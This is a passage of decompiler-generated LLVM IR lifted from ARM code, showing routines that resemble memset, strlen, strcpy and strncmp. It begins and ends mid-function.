  br i1 %v5_ec4c11, label %dec_label_pc_ec88, label %dec_label_pc_ec50.preheader

dec_label_pc_ec50.preheader:                      ; preds = %dec_label_pc_ec44
  %v1_ec5046 = inttoptr i32 %v0_ec5028 to i32*
  store i32 %v0_ec44, i32* %v1_ec5046, align 4
  %v3_ec5047 = add i32 %v0_ec5028, 4
  %v4_ec5048 = inttoptr i32 %v3_ec5047 to i32*
  %v5_ec5049 = load i32, i32* @ip, align 4
  store i32 %v5_ec5049, i32* %v4_ec5048, align 4
  %v6_ec5050 = add i32 %v0_ec5028, 8
  store i32 %v6_ec5050, i32* %r3.global-to-local, align 4
  %v0_ec5451 = load i32, i32* @r2, align 4
  %v1_ec5452 = add i32 %v0_ec5451, -8
  store i32 %v1_ec5452, i32* %r2.global-to-local, align 4
  %v5_ec5c53 = icmp slt i32 %v1_ec5452, 8
  br i1 %v5_ec5c53, label %dec_label_pc_ec50.dec_label_pc_ec88.loopexit_crit_edge, label %dec_label_pc_ec60

dec_label_pc_ec60:                                ; preds = %dec_label_pc_ec50.preheader, %dec_label_pc_ec48.dec_label_pc_ec50_crit_edge
  %v6_ec5055 = phi i32 [ %v6_ec50, %dec_label_pc_ec48.dec_label_pc_ec50_crit_edge ], [ %v6_ec5050, %dec_label_pc_ec50.preheader ]
  %v0_ec5054 = phi i32 [ %v12_ec7c, %dec_label_pc_ec48.dec_label_pc_ec50_crit_edge ], [ %v0_ec5028, %dec_label_pc_ec50.preheader ]
  %v1_ec60 = inttoptr i32 %v6_ec5055 to i32*
  %v2_ec60 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_ec60, i32* %v1_ec60, align 4
  %v3_ec60 = add i32 %v0_ec5054, 12
  %v4_ec60 = inttoptr i32 %v3_ec60 to i32*
  %v5_ec60 = load i32, i32* @ip, align 4
  store i32 %v5_ec60, i32* %v4_ec60, align 4
  %v6_ec60 = add i32 %v0_ec5054, 16
  store i32 %v6_ec60, i32* %r3.global-to-local, align 4
  %v0_ec64 = load i32, i32* %r2.global-to-local, align 4
  %v1_ec64 = add i32 %v0_ec64, -8
  store i32 %v1_ec64, i32* %r2.global-to-local, align 4
  %v5_ec6c = icmp slt i32 %v1_ec64, 8
  br i1 %v5_ec6c, label %dec_label_pc_ec60.dec_label_pc_ec88.loopexit_crit_edge, label %dec_label_pc_ec70

dec_label_pc_ec70:                                ; preds = %dec_label_pc_ec60
  %v1_ec70 = inttoptr i32 %v6_ec60 to i32*
  %v2_ec70 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_ec70, i32* %v1_ec70, align 4
  %v3_ec70 = add i32 %v0_ec5054, 20
  %v4_ec70 = inttoptr i32 %v3_ec70 to i32*
  %v5_ec70 = load i32, i32* @ip, align 4
  store i32 %v5_ec70, i32* %v4_ec70, align 4
  %v6_ec70 = add i32 %v0_ec5054, 24
  store i32 %v6_ec70, i32* %r3.global-to-local, align 4
  %v0_ec74 = load i32, i32* %r2.global-to-local, align 4
  %v1_ec74 = add i32 %v0_ec74, -8
  store i32 %v1_ec74, i32* %r2.global-to-local, align 4
  %v5_ec7c = icmp slt i32 %v1_ec74, 8
  br i1 %v5_ec7c, label %dec_label_pc_ec70.dec_label_pc_ec88.loopexit_crit_edge, label %dec_label_pc_ec48

dec_label_pc_ec48:                                ; preds = %dec_label_pc_ec70
  %v7_ec7c = inttoptr i32 %v6_ec70 to i32*
  %v8_ec7c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_ec7c, i32* %v7_ec7c, align 4
  %v9_ec7c = add i32 %v0_ec5054, 28
  %v10_ec7c = inttoptr i32 %v9_ec7c to i32*
  %v11_ec7c = load i32, i32* @ip, align 4
  store i32 %v11_ec7c, i32* %v10_ec7c, align 4
  %v12_ec7c = add i32 %v0_ec5054, 32
  store i32 %v12_ec7c, i32* %r3.global-to-local, align 4
  %v6_ec80 = load i32, i32* %r2.global-to-local, align 4
  %v7_ec80 = add i32 %v6_ec80, -8
  store i32 %v7_ec80, i32* %r2.global-to-local, align 4
  %v5_ec4c = icmp slt i32 %v7_ec80, 8
  br i1 %v5_ec4c, label %dec_label_pc_ec48.dec_label_pc_ec88.loopexit_crit_edge, label %dec_label_pc_ec48.dec_label_pc_ec50_crit_edge

dec_label_pc_ec48.dec_label_pc_ec50_crit_edge:    ; preds = %dec_label_pc_ec48
  %v2_ec50.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_ec50 = inttoptr i32 %v12_ec7c to i32*
  store i32 %v2_ec50.pre, i32* %v1_ec50, align 4
  %v3_ec50 = add i32 %v0_ec5054, 36
  %v4_ec50 = inttoptr i32 %v3_ec50 to i32*
  %v5_ec50 = load i32, i32* @ip, align 4
  store i32 %v5_ec50, i32* %v4_ec50, align 4
  %v6_ec50 = add i32 %v0_ec5054, 40
  store i32 %v6_ec50, i32* %r3.global-to-local, align 4
  %v0_ec54 = load i32, i32* %r2.global-to-local, align 4
  %v1_ec54 = add i32 %v0_ec54, -8
  store i32 %v1_ec54, i32* %r2.global-to-local, align 4
  %v5_ec5c = icmp slt i32 %v1_ec54, 8
  br i1 %v5_ec5c, label %dec_label_pc_ec50.dec_label_pc_ec88.loopexit_crit_edge, label %dec_label_pc_ec60

dec_label_pc_ec50.dec_label_pc_ec88.loopexit_crit_edge: ; preds = %dec_label_pc_ec48.dec_label_pc_ec50_crit_edge, %dec_label_pc_ec50.preheader
  %v1_ec54.lcssa = phi i32 [ %v1_ec5452, %dec_label_pc_ec50.preheader ], [ %v1_ec54, %dec_label_pc_ec48.dec_label_pc_ec50_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ec88

dec_label_pc_ec48.dec_label_pc_ec88.loopexit_crit_edge: ; preds = %dec_label_pc_ec48
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ec88

dec_label_pc_ec60.dec_label_pc_ec88.loopexit_crit_edge: ; preds = %dec_label_pc_ec60
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ec88

dec_label_pc_ec70.dec_label_pc_ec88.loopexit_crit_edge: ; preds = %dec_label_pc_ec70
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ec88

dec_label_pc_ec88:                                ; preds = %dec_label_pc_ec44, %dec_label_pc_ec50.dec_label_pc_ec88.loopexit_crit_edge, %dec_label_pc_ec48.dec_label_pc_ec88.loopexit_crit_edge, %dec_label_pc_ec60.dec_label_pc_ec88.loopexit_crit_edge, %dec_label_pc_ec70.dec_label_pc_ec88.loopexit_crit_edge, %dec_label_pc_ec20
  %v0_ec90 = phi i32 [ %v0_ec24, %dec_label_pc_ec20 ], [ %v1_ec74, %dec_label_pc_ec70.dec_label_pc_ec88.loopexit_crit_edge ], [ %v1_ec64, %dec_label_pc_ec60.dec_label_pc_ec88.loopexit_crit_edge ], [ %v7_ec80, %dec_label_pc_ec48.dec_label_pc_ec88.loopexit_crit_edge ], [ %v1_ec54.lcssa, %dec_label_pc_ec50.dec_label_pc_ec88.loopexit_crit_edge ], [ %v0_ec48.pr, %dec_label_pc_ec44 ]
  %v2_ec88 = icmp eq i32 %v0_ec90, 0
  store i1 %v2_ec88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec88, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_ec88
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_ec88
  %v1_ec90 = sub i32 7, %v0_ec90
  store i32 %v1_ec90, i32* %r2.global-to-local, align 4
  %v3_ec94 = mul i32 %v1_ec90, 4
  %v4_ec94 = add i32 %v3_ec94, ptrtoint (i32* @global_var_ec9c.396 to i32)
  call void @__pseudo_branch(i32 %v4_ec94)
  %v0_ec9c = load i32, i32* %r1.global-to-local, align 4
  %v1_ec9c = trunc i32 %v0_ec9c to i8
  %v2_ec9c = load i32, i32* %r3.global-to-local, align 4
  %v3_ec9c = inttoptr i32 %v2_ec9c to i8*
  store i8 %v1_ec9c, i8* %v3_ec9c, align 1
  %v4_ec9c = load i32, i32* %r3.global-to-local, align 4
  %v5_ec9c = add i32 %v4_ec9c, 1
  store i32 %v5_ec9c, i32* %r3.global-to-local, align 4
  %v0_eca0 = load i32, i32* %r1.global-to-local, align 4
  %v1_eca0 = trunc i32 %v0_eca0 to i8
  %v3_eca0 = inttoptr i32 %v5_ec9c to i8*
  store i8 %v1_eca0, i8* %v3_eca0, align 1
  %v4_eca0 = load i32, i32* %r3.global-to-local, align 4
  %v5_eca0 = add i32 %v4_eca0, 1
  store i32 %v5_eca0, i32* %r3.global-to-local, align 4
  %v0_eca4 = load i32, i32* %r1.global-to-local, align 4
  %v1_eca4 = trunc i32 %v0_eca4 to i8
  %v3_eca4 = inttoptr i32 %v5_eca0 to i8*
  store i8 %v1_eca4, i8* %v3_eca4, align 1
  %v4_eca4 = load i32, i32* %r3.global-to-local, align 4
  %v5_eca4 = add i32 %v4_eca4, 1
  store i32 %v5_eca4, i32* %r3.global-to-local, align 4
  %v0_eca8 = load i32, i32* %r1.global-to-local, align 4
  %v1_eca8 = trunc i32 %v0_eca8 to i8
  %v3_eca8 = inttoptr i32 %v5_eca4 to i8*
  store i8 %v1_eca8, i8* %v3_eca8, align 1
  %v4_eca8 = load i32, i32* %r3.global-to-local, align 4
  %v5_eca8 = add i32 %v4_eca8, 1
  store i32 %v5_eca8, i32* %r3.global-to-local, align 4
  %v0_ecac = load i32, i32* %r1.global-to-local, align 4
  %v1_ecac = trunc i32 %v0_ecac to i8
  %v3_ecac = inttoptr i32 %v5_eca8 to i8*
  store i8 %v1_ecac, i8* %v3_ecac, align 1
  %v4_ecac = load i32, i32* %r3.global-to-local, align 4
  %v5_ecac = add i32 %v4_ecac, 1
  store i32 %v5_ecac, i32* %r3.global-to-local, align 4
  %v0_ecb0 = load i32, i32* %r1.global-to-local, align 4
  %v1_ecb0 = trunc i32 %v0_ecb0 to i8
  %v3_ecb0 = inttoptr i32 %v5_ecac to i8*
  store i8 %v1_ecb0, i8* %v3_ecb0, align 1
  %v4_ecb0 = load i32, i32* %r3.global-to-local, align 4
  %v5_ecb0 = add i32 %v4_ecb0, 1
  store i32 %v5_ecb0, i32* %r3.global-to-local, align 4
  %v0_ecb4 = load i32, i32* %r1.global-to-local, align 4
  %v1_ecb4 = trunc i32 %v0_ecb4 to i8
  %v3_ecb4 = inttoptr i32 %v5_ecb0 to i8*
  store i8 %v1_ecb4, i8* %v3_ecb4, align 1
  %v4_ecb4 = load i32, i32* %r3.global-to-local, align 4
  %v5_ecb4 = add i32 %v4_ecb4, 1
  store i32 %v5_ecb4, i32* %r3.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_ec50, { 1, 0 }
  uselistorder i32 %v12_ec7c, { 1, 2, 0 }
  uselistorder i32 %v0_ec5054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_ec48.pr, { 0, 2, 1 }
  uselistorder i32 %v6_ec38, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_ec2c, { 1, 0 }
  uselistorder i32 %v0_ec24, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 19, 21, 17, 14, 15, 16, 13, 18, 20, 22 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 8, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 4, 3, 5, 2, 1, 8, 7, 0, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ec88, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_ec60, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_ecc0() local_unnamed_addr {
dec_label_pc_ecc0:
  %v0_ecc0 = load i32, i32* @r0, align 4
  %v1_ecc0 = and i32 %v0_ecc0, -4
  %v1_ecc4 = inttoptr i32 %v1_ecc0 to i32*
  %v2_ecc4 = load i32, i32* %v1_ecc4, align 4
  %v1_ecc8 = urem i32 %v0_ecc0, 4
  %v2_ecc8 = icmp eq i32 %v1_ecc8, 0
  %v1_eccc = sub nsw i32 0, %v1_ecc8
  br i1 %v2_ecc8, label %.preheader.preheader, label %dec_label_pc_ecd4

dec_label_pc_ecd4:                                ; preds = %dec_label_pc_ecc0
  %v1_ecd4 = or i32 %v2_ecc4, 255
  %v7_ecd8 = icmp eq i32 %v1_ecc8, 1
  br i1 %v7_ecd8, label %bb33, label %bb

bb:                                               ; preds = %dec_label_pc_ecd4
  %v9_ecdc = or i32 %v2_ecc4, 65535
  br label %bb33

bb33:                                             ; preds = %dec_label_pc_ecd4, %bb
  %v8_ece4 = phi i32 [ %v1_ecd4, %dec_label_pc_ecd4 ], [ %v9_ecdc, %bb ]
  %v7_ece4 = icmp eq i32 %v1_ecc8, 3
  br i1 %v7_ece4, label %bb34, label %.preheader.preheader

bb34:                                             ; preds = %bb33
  %v9_ece4 = or i32 %v8_ece4, 16711680
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %bb33, %bb34, %dec_label_pc_ecc0
  %v1_ecf4.ph = phi i32 [ %v2_ecc4, %dec_label_pc_ecc0 ], [ %v9_ece4, %bb34 ], [ %v8_ece4, %bb33 ]
  %v1_ece838 = urem i32 %v1_ecf4.ph, 256
  %v2_ece839 = icmp eq i32 %v1_ece838, 0
  %v2_ecec40 = and i32 %v1_ecf4.ph, 65280
  %v3_ecec41 = icmp eq i32 %v2_ecec40, 0
  %or.cond42 = or i1 %v2_ece839, %v3_ecec41
  %v2_ecf043 = and i32 %v1_ecf4.ph, 16711680
  %v3_ecf044 = icmp eq i32 %v2_ecf043, 0
  %or.cond3145 = or i1 %v3_ecf044, %or.cond42
  %v4_ecf446 = icmp ult i32 %v1_ecf4.ph, 16777216
  %or.cond3247 = or i1 %v4_ecf446, %or.cond3145
  br i1 %or.cond3247, label %dec_label_pc_ed04, label %.thread4

.thread4:                                         ; preds = %.preheader.preheader, %.thread4
  %v1_ecf81349 = phi i32 [ %v2_ecf814, %.thread4 ], [ %v1_eccc, %.preheader.preheader ]
  %v1_ecfc48.in = phi i32 [ %v1_ecfc48, %.thread4 ], [ %v1_ecc0, %.preheader.preheader ]
  %v1_ecfc48 = add i32 %v1_ecfc48.in, 4
  %v2_ecf814 = add i32 %v1_ecf81349, 4
  %v2_ecfc = inttoptr i32 %v1_ecfc48 to i32*
  %v3_ecfc = load i32, i32* %v2_ecfc, align 4
  %v1_ece8 = urem i32 %v3_ecfc, 256
  %v2_ece8 = icmp eq i32 %v1_ece8, 0
  %v2_ecec = and i32 %v3_ecfc, 65280
  %v3_ecec = icmp eq i32 %v2_ecec, 0
  %or.cond = or i1 %v2_ece8, %v3_ecec
  %v2_ecf0 = and i32 %v3_ecfc, 16711680
  %v3_ecf0 = icmp eq i32 %v2_ecf0, 0
  %or.cond31 = or i1 %v3_ecf0, %or.cond
  %v4_ecf4 = icmp ult i32 %v3_ecfc, 16777216
  %or.cond32 = or i1 %v4_ecf4, %or.cond31
  br i1 %or.cond32, label %dec_label_pc_ed04, label %.thread4

dec_label_pc_ed04:                                ; preds = %.thread4, %.preheader.preheader
  %v1_ecf813.lcssa = phi i32 [ %v1_eccc, %.preheader.preheader ], [ %v2_ecf814, %.thread4 ]
  %v2_ece8.lcssa = phi i1 [ %v2_ece839, %.preheader.preheader ], [ %v2_ece8, %.thread4 ]
  %v3_ecec.lcssa = phi i1 [ %v3_ecec41, %.preheader.preheader ], [ %v3_ecec, %.thread4 ]
  %v3_ecf0.lcssa = phi i1 [ %v3_ecf044, %.preheader.preheader ], [ %v3_ecf0, %.thread4 ]
  br i1 %v2_ece8.lcssa, label %.thread10, label %bb35

bb35:                                             ; preds = %dec_label_pc_ed04
  %v2_ed08 = add i32 %v1_ecf813.lcssa, 1
  br i1 %v3_ecec.lcssa, label %.thread10, label %bb36

bb36:                                             ; preds = %bb35
  %v2_ed1017 = add i32 %v1_ecf813.lcssa, 2
  br i1 %v3_ecf0.lcssa, label %.thread10, label %bb37

bb37:                                             ; preds = %bb36
  %v2_ed18 = add i32 %v1_ecf813.lcssa, 3
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_ed04, %bb35, %bb36, %bb37
  %v1_ed1c = phi i32 [ %v2_ed08, %bb35 ], [ %v2_ed1017, %bb36 ], [ %v2_ed18, %bb37 ], [ %v1_ecf813.lcssa, %dec_label_pc_ed04 ]
  ret i32 %v1_ed1c

; uselistorder directives
  uselistorder i32 %v1_ecf813.lcssa, { 1, 3, 2, 0 }
  uselistorder i32 %v3_ecfc, { 3, 2, 1, 0 }
  uselistorder i32 %v1_ecf4.ph, { 1, 2, 3, 0 }
  uselistorder i32 %v1_ecc8, { 3, 2, 1, 0 }
  uselistorder i32 16711680, { 1, 0, 2 }
  uselistorder label %.thread10, { 3, 2, 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0, 2 }
  uselistorder label %bb33, { 1, 0 }
}

define i32 @function_ed20(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_ed20:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_ed20 = sub i32 %arg1, %tmp
  %v1_ed24 = add i32 %v2_ed20, -1
  store i32 %v1_ed24, i32* @r2, align 4
  %v2_ed284 = load i8, i8* %arg2, align 1
  %v5_ed286 = add i32 %tmp, 1
  store i32 %v5_ed286, i32* %r1.global-to-local, align 4
  %v2_ed2c7 = icmp eq i8 %v2_ed284, 0
  store i1 %v2_ed2c7, i1* %cpsr_z.global-to-local, align 1
  %v5_ed308 = inttoptr i32 %arg1 to i8*
  store i8 %v2_ed284, i8* %v5_ed308, align 1
  %v0_ed349 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ed349, label %dec_label_pc_ed38, label %dec_label_pc_ed28.dec_label_pc_ed28_crit_edge

dec_label_pc_ed28.dec_label_pc_ed28_crit_edge:    ; preds = %dec_label_pc_ed20, %dec_label_pc_ed28.dec_label_pc_ed28_crit_edge
  %v0_ed28.pre = load i32, i32* %r1.global-to-local, align 4
  %v3_ed30.pre = load i32, i32* @r2, align 4
  %v1_ed28 = inttoptr i32 %v0_ed28.pre to i8*
  %v2_ed28 = load i8, i8* %v1_ed28, align 1
  %v5_ed28 = add i32 %v0_ed28.pre, 1
  store i32 %v5_ed28, i32* %r1.global-to-local, align 4
  %v2_ed2c = icmp eq i8 %v2_ed28, 0
  store i1 %v2_ed2c, i1* %cpsr_z.global-to-local, align 1
  %v4_ed30 = add i32 %v5_ed28, %v3_ed30.pre
  %v5_ed30 = inttoptr i32 %v4_ed30 to i8*
  store i8 %v2_ed28, i8* %v5_ed30, align 1
  %v0_ed34 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ed34, label %dec_label_pc_ed38, label %dec_label_pc_ed28.dec_label_pc_ed28_crit_edge

dec_label_pc_ed38:                                ; preds = %dec_label_pc_ed28.dec_label_pc_ed28_crit_edge, %dec_label_pc_ed20
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ed28.dec_label_pc_ed28_crit_edge, { 1, 0 }
}

define i32 @function_ed3c(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_ed3c:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_ed3c = load i32, i32* %r2.global-to-local, align 4
  %v0_ed44 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ed44, i32* @lr, align 4
  %tmp143 = icmp ult i32 %v0_ed3c, 4
  br i1 %tmp143, label %.thread59, label %dec_label_pc_ed70

.thread59:                                        ; preds = %dec_label_pc_ed3c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ee4cthread-pre-split

dec_label_pc_ed58:                                ; preds = %thread-pre-split
  store i32 %v2_edac, i32* %r0.global-to-local, align 4
  ret i32 %v2_edac

dec_label_pc_ed60:                                ; preds = %bb74, %.thread6
  store i32 %v2_edd4, i32* %r0.global-to-local, align 4
  ret i32 %v2_edd4

dec_label_pc_ed68:                                ; preds = %bb77, %bb68, %.thread14, %.thread10, %.thread, %bb80
  %v1_ed68 = phi i32 [ 0, %.thread14 ], [ 0, %.thread10 ], [ 0, %.thread ], [ %v3_ee24, %bb80 ], [ %v4_edec, %bb77 ], [ %v3_ed74, %bb68 ]
  %v0_ed68 = phi i32 [ %v3_ee28, %.thread14 ], [ %v4_edf0, %.thread10 ], [ %v3_ed78, %.thread ], [ %v3_ee28, %bb80 ], [ %v4_edf0, %bb77 ], [ %v3_ed78, %bb68 ]
  %v2_ed68 = sub nsw i32 %v1_ed68, %v0_ed68
  store i32 %v2_ed68, i32* %r0.global-to-local, align 4
  ret i32 %v2_ed68

dec_label_pc_ed70:                                ; preds = %dec_label_pc_ed3c
  %v3_ed70 = udiv i32 %v0_ed3c, 4
  %v0_ed78.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_ed74

dec_label_pc_ed74:                                ; preds = %dec_label_pc_ee14, %dec_label_pc_ed70
  %v0_ee14 = phi i32 [ %v1_ee14, %dec_label_pc_ee14 ], [ %v3_ed70, %dec_label_pc_ed70 ]
  %v0_edbc = phi i32 [ %v1_edf8, %dec_label_pc_ee14 ], [ %v0_ed78.pre, %dec_label_pc_ed70 ]
  %v0_ed94 = phi i32 [ %v1_eda8, %dec_label_pc_ee14 ], [ %v0_ed44, %dec_label_pc_ed70 ]
  %v1_ed74 = inttoptr i32 %v0_ed94 to i8*
  %v2_ed74 = load i8, i8* %v1_ed74, align 1
  %v3_ed74 = zext i8 %v2_ed74 to i32
  store i32 %v3_ed74, i32* %r0.global-to-local, align 4
  %v1_ed78 = inttoptr i32 %v0_edbc to i8*
  %v2_ed78 = load i8, i8* %v1_ed78, align 1
  %v3_ed78 = zext i8 %v2_ed78 to i32
  %v2_ed7c = sub nsw i32 %v3_ed74, %v3_ed78
  %v9_ed7c = icmp eq i8 %v2_ed74, %v2_ed78
  br i1 %v9_ed7c, label %bb67, label %bb

bb:                                               ; preds = %dec_label_pc_ed74
  br label %bb67

bb67:                                             ; preds = %dec_label_pc_ed74, %bb
  %v1_ed88 = phi i32 [ %v2_ed7c, %dec_label_pc_ed74 ], [ 1, %bb ]
  %v2_ed84 = icmp eq i8 %v2_ed74, 0
  br i1 %v2_ed84, label %.thread, label %bb68

.thread:                                          ; preds = %bb67
  br label %dec_label_pc_ed68

bb68:                                             ; preds = %bb67
  %v2_ed8c = icmp eq i32 %v1_ed88, 0
  br i1 %v2_ed8c, label %dec_label_pc_ed94, label %dec_label_pc_ed68

dec_label_pc_ed94:                                ; preds = %bb68
  %v1_ed94 = add i32 %v0_ed94, 1
  %v2_ed98 = inttoptr i32 %v1_ed94 to i8*
  %v3_ed98 = load i8, i8* %v2_ed98, align 1
  %v4_ed98 = zext i8 %v3_ed98 to i32
  store i32 %v4_ed98, i32* %r0.global-to-local, align 4
  %v1_ed9c = add i32 %v0_edbc, 1
  %v2_ed9c = inttoptr i32 %v1_ed9c to i8*
  %v3_ed9c = load i8, i8* %v2_ed9c, align 1
  %v4_ed9c = zext i8 %v3_ed9c to i32
  %v1_eda0 = add i32 %v0_ed94, 2
  %v1_eda8 = add i32 %v0_ed94, 4
  store i32 %v1_eda8, i32* @lr, align 4
  %v2_edac = sub nsw i32 %v4_ed98, %v4_ed9c
  %v9_edac = icmp eq i8 %v3_ed98, %v3_ed9c
  br i1 %v9_edac, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_ed94
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_ed94, %bb69
  %v1_edb8 = phi i32 [ %v2_edac, %dec_label_pc_ed94 ], [ 1, %bb69 ]
  %v2_edb4 = icmp eq i8 %v3_ed98, 0
  br i1 %v2_edb4, label %bb71, label %thread-pre-split

bb71:                                             ; preds = %bb70
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb70, %bb71
  %v0_edc0 = phi i32 [ 1, %bb71 ], [ %v1_edb8, %bb70 ]
  %v2_edc0 = icmp eq i32 %v0_edc0, 0
  br i1 %v2_edc0, label %dec_label_pc_edcc, label %dec_label_pc_ed58

dec_label_pc_edcc:                                ; preds = %thread-pre-split
  %v1_edc4 = add i32 %v0_edbc, 2
  %v2_edcc = inttoptr i32 %v1_eda0 to i8*
  %v3_edcc = load i8, i8* %v2_edcc, align 1
  %v4_edcc = zext i8 %v3_edcc to i32
  store i32 %v4_edcc, i32* %r0.global-to-local, align 4
  %v2_edd0 = inttoptr i32 %v1_edc4 to i8*
  %v3_edd0 = load i8, i8* %v2_edd0, align 1
  %v4_edd0 = zext i8 %v3_edd0 to i32
  %v2_edd4 = sub nsw i32 %v4_edcc, %v4_edd0
  %v9_edd4 = icmp eq i8 %v3_edcc, %v3_edd0
  br i1 %v9_edd4, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_edcc
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_edcc, %bb72
  %v1_ede0 = phi i32 [ %v2_edd4, %dec_label_pc_edcc ], [ 1, %bb72 ]
  %v2_eddc = icmp eq i8 %v3_edcc, 0
  br i1 %v2_eddc, label %.thread6, label %bb74

.thread6:                                         ; preds = %bb73
  br label %dec_label_pc_ed60

bb74:                                             ; preds = %bb73
  %v2_ede4 = icmp eq i32 %v1_ede0, 0
  br i1 %v2_ede4, label %dec_label_pc_edec, label %dec_label_pc_ed60

dec_label_pc_edec:                                ; preds = %bb74
  %v1_edec = add i32 %v0_ed94, 3
  %v2_edec = inttoptr i32 %v1_edec to i8*
  %v3_edec = load i8, i8* %v2_edec, align 1
  %v4_edec = zext i8 %v3_edec to i32
  store i32 %v4_edec, i32* %r0.global-to-local, align 4
  %v1_edf0 = add i32 %v0_edbc, 3
  %v2_edf0 = inttoptr i32 %v1_edf0 to i8*
  %v3_edf0 = load i8, i8* %v2_edf0, align 1
  %v4_edf0 = zext i8 %v3_edf0 to i32
  %v1_edf8 = add i32 %v0_edbc, 4
  store i32 %v1_edf8, i32* @r1, align 4
  %v2_edfc = sub nsw i32 %v4_edec, %v4_edf0
  %v9_edfc = icmp eq i8 %v3_edec, %v3_edf0
  br i1 %v9_edfc, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_edec
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_edec, %bb75
  %v1_ee08 = phi i32 [ %v2_edfc, %dec_label_pc_edec ], [ 1, %bb75 ]
  %v2_ee04 = icmp eq i8 %v3_edec, 0
  br i1 %v2_ee04, label %.thread10, label %bb77

.thread10:                                        ; preds = %bb76
  br label %dec_label_pc_ed68

bb77:                                             ; preds = %bb76
  %v2_ee0c = icmp eq i32 %v1_ee08, 0
  br i1 %v2_ee0c, label %dec_label_pc_ee14, label %dec_label_pc_ed68

dec_label_pc_ee14:                                ; preds = %bb77
  %v1_ee14 = add i32 %v0_ee14, -1
  %v7_ee14 = icmp eq i32 %v0_ee14, 1
  br i1 %v7_ee14, label %dec_label_pc_ee1c, label %dec_label_pc_ed74

dec_label_pc_ee1c:                                ; preds = %dec_label_pc_ee14
  %v1_ee1c = urem i32 %v0_ed3c, 4
  store i32 %v1_ee1c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ee4c

dec_label_pc_ee24:                                ; preds = %dec_label_pc_ee4c
  %v1_ee24 = inttoptr i32 %v0_ee44 to i8*
  %v2_ee24 = load i8, i8* %v1_ee24, align 1
  %v3_ee24 = zext i8 %v2_ee24 to i32
  store i32 %v3_ee24, i32* %r0.global-to-local, align 4
  %v0_ee28 = load i32, i32* @r1, align 4
  %v1_ee28 = inttoptr i32 %v0_ee28 to i8*
  %v2_ee28 = load i8, i8* %v1_ee28, align 1
  %v3_ee28 = zext i8 %v2_ee28 to i32
  %v2_ee2c = sub nsw i32 %v3_ee24, %v3_ee28
  %v9_ee2c = icmp eq i8 %v2_ee24, %v2_ee28
  br i1 %v9_ee2c, label %bb79, label %bb78

bb78:                                             ; preds = %dec_label_pc_ee24
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_ee24, %bb78
  %v1_ee38 = phi i32 [ %v2_ee2c, %dec_label_pc_ee24 ], [ 1, %bb78 ]
  %v2_ee34 = icmp eq i8 %v2_ee24, 0
  br i1 %v2_ee34, label %.thread14, label %bb80

.thread14:                                        ; preds = %bb79
  br label %dec_label_pc_ed68

bb80:                                             ; preds = %bb79
  %v2_ee3c = icmp eq i32 %v1_ee38, 0
  br i1 %v2_ee3c, label %dec_label_pc_ee44, label %dec_label_pc_ed68

dec_label_pc_ee44:                                ; preds = %bb80
  %v1_ee44 = add i32 %v0_ee44, 1
  store i32 %v1_ee44, i32* @lr, align 4
  %v1_ee48 = add i32 %v0_ee28, 1
  store i32 %v1_ee48, i32* @r1, align 4
  br label %dec_label_pc_ee4cthread-pre-split

dec_label_pc_ee4cthread-pre-split:                ; preds = %.thread59, %dec_label_pc_ee44
